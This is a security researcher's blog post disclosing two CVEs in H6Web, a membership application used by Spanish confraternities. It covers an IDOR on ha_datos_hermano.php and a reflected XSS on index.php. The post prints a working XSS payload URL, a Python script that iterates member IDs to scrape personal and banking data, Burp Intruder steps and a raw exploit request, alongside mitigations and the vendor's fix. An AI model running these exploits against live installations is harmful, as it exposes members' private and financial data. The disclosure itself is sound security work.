---
layout: single
title: Analysis of a Vulnerability in H6Web, Hacking Holy Week - My First CVEs
excerpt: Discovery and analysis of two critical vulnerabilities (IDOR and XSS) in H6Web, resulting in my first assigned CVEs.
date: 2025-02-13
classes: wide
header:
  teaser: /assets/images/CVEs/logo.png
  teaser_home_page: true
  icon: /assets/images/CVEs/logo.png
categories:
  - Review
  - Infosec
  - Vulns
  - Hacking
  - CVE
  - Pentesting
tags:
  - Web Pentesting
  - IDOR
  - Insecure Direct Object Reference
  - Reflected XSS
  - CVE
  - H6Web
---

# 🎯 My First CVEs Hacking Holy Week

## 🌟 Introduction

I have always been interested in the way computer systems are managed in churches, confraternities, etc. So I decided to investigate and discover vulnerabilities.

Recently, I discovered a security vulnerability in the web application **H6Web**, widely used by Cofradias in Spain and other similar organisations. This vulnerability is classified as _Insecure Direct Object Reference (IDOR)_ and insecure permissions, allowing unauthorised access to confidential user information.

This finding has been officially recognised and assigned **two CVEs** (`CVE-2025-1270` and `CVE-2025-1271`), which marks an important milestone in my cybersecurity career.

## 🔍 What is a CVE?

**CVE** (_Common Vulnerabilities and Exposures_) is a unique identifier assigned to a discovered security vulnerability in software or hardware. Its purpose is to provide a standard for researchers and organizations to track and reference vulnerabilities uniformly across various security databases and systems.

Each CVE includes:
- 📝 A detailed description of the vulnerability
- 💥 Its impact
- 🛡️ Possible solutions or mitigations

It is managed by **MITRE Corporation** in collaboration with the global security community.

## 📋 CVE Details and Official Links

As confirmed by **INCIBE**, two CVEs have been assigned to these vulnerabilities in H6Web:

- 🔴 **CVE-2025-1270**: [INCIBE Report](https://www.incibe.es/incibe-cert/alerta-temprana/avisos/multiples-vulnerabilidades-en-h6web-de-grupo-anapi)
- 🔴 **CVE-2025-1271**: [INCIBE Report](https://www.incibe.es/incibe-cert/alerta-temprana/avisos/multiples-vulnerabilidades-en-h6web-de-grupo-anapi)

## ⚠️ Vulnerability Details

| Category | Details |
|----------|---------|
| **Affected Application** | H6Web |
| **Vulnerability Type** | _Incorrect Access Control / Insecure Permissions (IDOR), Cross-Site Scripting (XSS)_ |
| **Attack Type** | Remote |
| **Impact** | Unauthorized access to authenticated users' sensitive information and possible JavaScript injection |

## Technical Description

### CVE-2025-1270: IDOR Vulnerability

An IDOR vulnerability has been identified in the endpoint:

```
/h6web/ha_datos_hermano.php
```

The application does not validate if the authenticated user has permissions to access the data associated with the `pkrelacionado` parameter in a POST request. This allows an attacker to modify this parameter and access other users' information without restrictions.

### CVE-2025-1271: Cross-Site Scripting (XSS) Reflected

A Reflected XSS vulnerability exists in the following endpoint:

```
h6web/index.php?mensaje1=<dETAILS%0aopen%0aonToGgle%0a=%0aa=alert,a(99)%20x>
```

This vulnerability allows an attacker to inject malicious JavaScript code that can result in:
- Theft of sensitive information
- Identity impersonation
- Execution of unauthorized actions

## Exposed Data and Proof of Concept

### Exposed Data

Below is an example of the data that can be exposed through this vulnerability (with sensitive data partially hidden for privacy concerns):

| Field | Value |
|-------|-------|
| Brother No. | [HIDDEN] |
| Real No. | [HIDDEN] |
| Name | [HIDDEN] |
| Surnames | [HIDDEN] |
| Registration Date | [HIDDEN] |
| Birth Date | [HIDDEN] |
| ID Number | [HIDDEN] |
| Address | [HIDDEN] |
| City | [HIDDEN] |
| Postal Code | [HIDDEN] |
| Province | [HIDDEN] |
| Phone | [HIDDEN] |
| Mobile | [HIDDEN] |
| Email | [HIDDEN] |
| Pending Payments | [HIDDEN] |
| Payment Method | [HIDDEN] |
| Bank Account | [HIDDEN] |
| Periodicity | [HIDDEN] |

### Proof of Concept (PoC)

#### Image of the Vulnerability

![PoC](/assets/images/CVEs/poc1.png)

#### Exploitation Code

Below is a basic Python exploit that demonstrates how an attacker could extract user data by modifying the pkrelacionado parameter:

```python
import requests
from bs4 import BeautifulSoup

url = 'https://URL/h6web/ha_datos_hermano.php'

cookies = {
    "PHPSESSID": "be52565aea157fd5a15b654338129b55"
}

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

for i in range(1, 5):  # Iterate over different ID values
    data = {
        "pkrelacionado": i
    }
    response = requests.post(url, cookies=cookies, headers=headers, data=data)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        table = soup.find('table', {'class': 'tabla1'})

        if table:
            for row in table.find_all('tr'):
                cells = row.find_all(['td', 'th'])
                cell_text = [cell.get_text(strip=True) for cell in cells]
                print(cell_text)
        else:
            print('Table "tabla1" not found')
    else:
        print(f'HTTP Request Error: {response.status_code}')
```

#### Burp Suite Exploitation Steps

To exploit this vulnerability using Burp Suite:

1. Intercept a valid request to the `/h6web/ha_datos_hermano.php` endpoint
2. Modify the `pkrelacionado` parameter value to different user numbers
3. Send the request and observe the response with other users' sensitive data
4. Automate the exploitation using Burp Intruder to iterate over multiple `pkrelacionado` values

- HTTP EXAMPLE:

```
POST /h6web/ha_datos_hermano.php HTTP/2
Host: URL
Cookie: PHPSESSID=dcBd593c29b47b1a0b5c8e8aca9013
Content-Length: 18
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9
Priority: u=0

pkrelacionado=4104
```

### 🛠️ Security Recommendations

To mitigate this vulnerability, implementing the following measures is recommended:

1. 🔒 **Permission Validation**: Verify that the authenticated user has rights to the requested resource before returning any information.

2. 🔑 **Role-Based Access Control (RBAC)**: Implement a role-based access control system to clearly define who can access what information.

3. 📝 **Activity Logging**: Monitor and log unusual or suspicious requests to detect attempts to exploit vulnerabilities.

4. 🔍 **Regular Security Testing**: Conduct code audits and penetration testing to identify and correct vulnerabilities before they can be exploited.

## ✅ Solution

The Grupo Anapi team has implemented the following measures:

1. 🛑 The IDOR vulnerability has been completely disabled
2. 🔄 The XSS vulnerability has been fixed in the latest version
3. ⚡ All users are recommended to update to the latest version

## 🎉 Conclusion

This finding highlights the importance of implementing proper access controls in web applications. The assignment of two CVEs to these vulnerabilities reinforces the need to continue investigating and reporting security issues to make the Internet a safer place.

**My first CVEs, and many more to come!** 🚀
